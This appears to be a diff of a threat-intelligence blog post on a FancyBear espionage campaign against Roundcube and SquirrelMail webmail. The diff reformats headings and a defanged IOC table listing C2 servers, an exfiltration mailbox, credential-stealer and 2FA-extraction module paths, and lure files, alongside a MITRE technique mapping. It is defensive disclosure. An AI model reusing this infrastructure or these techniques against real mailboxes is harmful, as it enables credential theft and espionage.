 This analysis, built on the foundations of reporting by [Hunt.io](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation), [CERT-UA](https://cert.gov.ua/article/6281123), and [ESET](https://www.welivesecurity.com/en/eset-research/operation-roundpress/), provides what we believe is one of the most interesting views ever obtained into an active cyber-enabled Russian espionage operation - not through sophisticated intelligence collection, but because FancyBear **left the door open**. The targeting was not random - Ukrainian regional prosecutors were the single most compromised group, potentially reflecting intelligence requirements related to war crimes investigations, while military targeting across **four NATO member states** aligns with documented regional security developments including the July 2024 Romania-Bulgaria-Greece military mobility agreement.
 
-From a tradecraft perspective, this campaign reveals both capability and carelessness. FancyBear developed a modular, multi-platform exploitation toolkit where a victim simply *opening* a malicious email - **with no further clicks** - could result in their credentials stolen, their 2FA bypassed, emails within their mailbox exfiltrated, and a silent forwarding rule established that persists indefinitely. 
+From a tradecraft perspective, this campaign reveals both capability and carelessness. FancyBear developed a modular, multi-platform exploitation toolkit where a victim simply *opening* a malicious email - **with no further clicks** - could result in their credentials stolen, their 2FA bypassed, emails within their mailbox exfiltrated, and a silent forwarding rule established that persists indefinitely.
 
 They evolved their indicators after CERT-UA's October 2024 disclosure, potentially demonstrating active monitoring of public reporting. Although they operated from the **same C2 server** for over **500 days** after public attribution.
 
-> Even the most capable threat actors make mistakes. We hope this analysis serves as both a resource for defenders protecting webmail infrastructure and a reminder that "sophisticated" does not mean "infallible". 
+> Even the most capable threat actors make mistakes. We hope this analysis serves as both a resource for defenders protecting webmail infrastructure and a reminder that "sophisticated" does not mean "infallible".
 
-# IOCs 
+## IOCs
 
-| Indicator | Type | Context |
-|-----------|------|---------|
-| 203.161.50[.]145 | IP Address | FancyBear C2 (NameCheap VPS); CERT-UA attribution; Roundcube exploitation (CVE-2023-43770), ClickFix; Operation Roundish opendir on port 8889 |
-| 162.0.236[.]189 | IP Address | NameCheap VPS; Typosquat domain gov.vppdr[.]com resolves to this IP  |
-| 209.74.89[.]76 | IP Address | NameCheap VPS; Typosquat domain mail.govmk[.]com resolves to this IP |  
-| zhblz[.]com | Domain | Primary C2 domain; hosts XSS payloads, JS modules, C2 logging, credential phishing, lure PDFs; resolves to 203.161.50[.]145 |
-| gov.vppdr[.]com | Domain | Attacker-controlled; observed in testing SquirrelMail |
-| gov.vppdr[.]com | Domain | Attacker-controlled; typosquat of vppdr.gp.gov.ua; Sieve redirect target and SquirrelMail victim addresses (e.g. pru.mik@gov.vppdr.com) |
-| advenwolf@proton[.]me | Email | Primary exfil/collection mailbox; Sieve forwarding target in worker.js/old_worker.js/scriptTaker; referenced in Hunt.io and CERT-UA |
-| /zJ2w9x | URL Path | C2 telemetry logging endpoint (GET ?log=); used by worker.js, old_worker.js, worker2.js |
-| /zJ2w9xP8cVb3D4s1mQe7rX6fT5yLg0HhKjNuAoIiZpCkRlOvBtWnYqMUEaSdvGbJ | URL Path | Long C2 logging path variant used by scriptTaker.js; telemetry in url.txt |
-| SystemHealthChek | String | Roundcube Sieve filter name in scriptTaker.js; seen in CERT-UA reporting |
-| SystemProtect | String | Roundcube Sieve filter name in addRedirectMailBox.js |
-| /zJ2w9x/uploadfile/ | URL Path | Roundcube email exfiltration (POST .eml files) |
-| /authentification.php | URL Path | Phishing form action | 
-| /worker | URL Path | Roundcube XSS payload delivery (worker.js) |
-| /worker2 | URL Path | SquirrelMail XSS payload delivery (worker2.js) |
-| /addRedirectMailBox.js | URL Path | Sieve rule module (Roundcube) |
-| /getUserCredentials.js | URL Path | Credential-stealer module (worker2) |
-| /getUserCredentialsOLD.js | URL Path | Credential-stealer module (worker/old_worker) |
-| /keyTwoAuth.js | URL Path | 2FA/TOTP extraction module (Roundcube twofactor_gauthenticator) |
-| /adbook.js | URL Path | Roundcube address book exfil module  |
-| /delTwoAuth.js | URL Path | 2FA deletion/manipulation module |
-| Adob_Scan_15_ian._2025[.]pdf | File Name | Romanian air-force lure; post–phishing-login redirect target on zhblz.com |
-| defense[.]pdf | File Name | Ukrainian defense support lure |
-| dokladMVR[.]pdf | File Name | Bulgarian Interior Ministry report lure |
-| energetikamk[.]pdf | File Name | North Macedonian energy sector lure |
-| oborona[.]pdf | File Name | Ukrainian/defense lure |
-| secure: bigdick | HTTP Header | Optional C2 auth header in servertest.py and backuBDMS/worker.js |
-| roundcube[.]html | File Name | Phishing landing (Romanian Airforce Roundcube) |
-| logon[.]html | File Name | Phishing landing (Ascentio clone) |
+| Indicator | Type | Context | Confidence | Classification |
+|---|---|---|---|---|
+| `203.161.50[.]145` | IPv4 | FancyBear C2 (NameCheap VPS); CERT-UA attribution; Roundcube exploitation (CVE-2023-43770), ClickFix; Operation Roundish opendir on port 8889 | Not stated | reported |
+| `162.0.236[.]189` | IPv4 | NameCheap VPS; Typosquat domain gov.vppdr[.]com resolves to this IP | Not stated | reported |
+| `209.74.89[.]76` | IPv4 | NameCheap VPS; Typosquat domain mail.govmk[.]com resolves to this IP | Not stated | reported |
+| `zhblz[.]com` | Domain | Primary C2 domain; hosts XSS payloads, JS modules, C2 logging, credential phishing, lure PDFs; resolves to 203.161.50[.]145 | Not stated | reported |
+| `gov.vppdr[.]com` | Domain | Attacker-controlled; observed in testing SquirrelMail | Not stated | reported |
+| `gov.vppdr[.]com` | Domain | Attacker-controlled; typosquat of vppdr.gp.gov.ua; Sieve redirect target and SquirrelMail victim addresses (e.g. pru.mik@gov.vppdr.com) | Not stated | reported |
+| `advenwolf@proton[.]me` | Email | Primary exfil/collection mailbox; Sieve forwarding target in worker.js/old_worker.js/scriptTaker; referenced in Hunt.io and CERT-UA | Not stated | reported |
+| `/zJ2w9x` | URI path | C2 telemetry logging endpoint (GET ?log=); used by worker.js, old_worker.js, worker2.js | Not stated | reported |
+| `/zJ2w9xP8cVb3D4s1mQe7rX6fT5yLg0HhKjNuAoIiZpCkRlOvBtWnYqMUEaSdvGbJ` | URI path | Long C2 logging path variant used by scriptTaker.js; telemetry in url.txt | Not stated | reported |
+| `SystemHealthChek` | String | Roundcube Sieve filter name in scriptTaker.js; seen in CERT-UA reporting | Not stated | reported |
+| `SystemProtect` | String | Roundcube Sieve filter name in addRedirectMailBox.js | Not stated | reported |
+| `/zJ2w9x/uploadfile/` | URI path | Roundcube email exfiltration (POST .eml files) | Not stated | reported |
+| `/authentification.php` | URI path | Phishing form action | Not stated | reported |
+| `/worker` | URI path | Roundcube XSS payload delivery (worker.js) | Not stated | reported |
+| `/worker2` | URI path | SquirrelMail XSS payload delivery (worker2.js) | Not stated | reported |
+| `/addRedirectMailBox.js` | URI path | Sieve rule module (Roundcube) | Not stated | reported |
+| `/getUserCredentials.js` | URI path | Credential-stealer module (worker2) | Not stated | reported |
+| `/getUserCredentialsOLD.js` | URI path | Credential-stealer module (worker/old_worker) | Not stated | reported |
+| `/keyTwoAuth.js` | URI path | 2FA/TOTP extraction module (Roundcube twofactor_gauthenticator) | Not stated | reported |
+| `/adbook.js` | URI path | Roundcube address book exfil module | Not stated | reported |
+| `/delTwoAuth.js` | URI path | 2FA deletion/manipulation module | Not stated | reported |
+| `Adob_Scan_15_ian._2025[.]pdf` | Filename | Romanian air-force lure; post–phishing-login redirect target on zhblz.com | Not stated | reported |
+| `defense[.]pdf` | Filename | Ukrainian defense support lure | Not stated | reported |
+| `dokladMVR[.]pdf` | Filename | Bulgarian Interior Ministry report lure | Not stated | reported |
+| `energetikamk[.]pdf` | Filename | North Macedonian energy sector lure | Not stated | reported |
+| `oborona[.]pdf` | Filename | Ukrainian/defense lure | Not stated | reported |
+| `secure: bigdick` | HTTP header | Optional C2 auth header in servertest.py and backuBDMS/worker.js | Not stated | reported |
+| `roundcube[.]html` | Filename | Phishing landing (Romanian Airforce Roundcube) | Not stated | reported |
+| `logon[.]html` | Filename | Phishing landing (Ascentio clone) | Not stated | reported |
 
-# MITRE
+## MITRE
 
 | Tactic | ID | Technique | Observed Usage |
 |---|---|---|---|
@@ -744,7 +752,7 @@ They evolved their indicators after CERT-UA's October 2024 disclosure, potential
 | **Command and Control** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | All C2 communication over HTTPS; telemetry logging via GET parameters, email exfiltration via POST |
 | **Command and Control** | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Additional JS modules (`adbook.js`, `keyTwoAuth.js`, `getUserCredentials.js`, `addRedirectMailBox.js`) dynamically fetched from C2 and executed via `eval()` |
 
-# Acknowledgements 
+## Acknowledgements
 
 Ctrl-Alt-Intel would like to thank [Hunt.io](https://hunt.io) for their initial discovery, [CERT-UA](https://cert.gov.ua/article/6281123) for their continued vigilance in tracking this infrastructure, and [ESET](https://www.welivesecurity.com/en/eset-research/operation-roundpress/) for their broader mapping of the Operation RoundPress campaign.
 
@@ -752,7 +760,7 @@ We also wanted to thank [Will Thomas](https://x.com/BushidoToken) from [Team Cym
 
 We also want to thank Ctrl-Alt-Intel researcher, [@ice_wzl_cyber](https://x.com/ice_wzl_cyber), for his contributions in tracking this campaign and writing this blog.
 
-# References
+## References
 
 | Source | Title |
 |---|---|
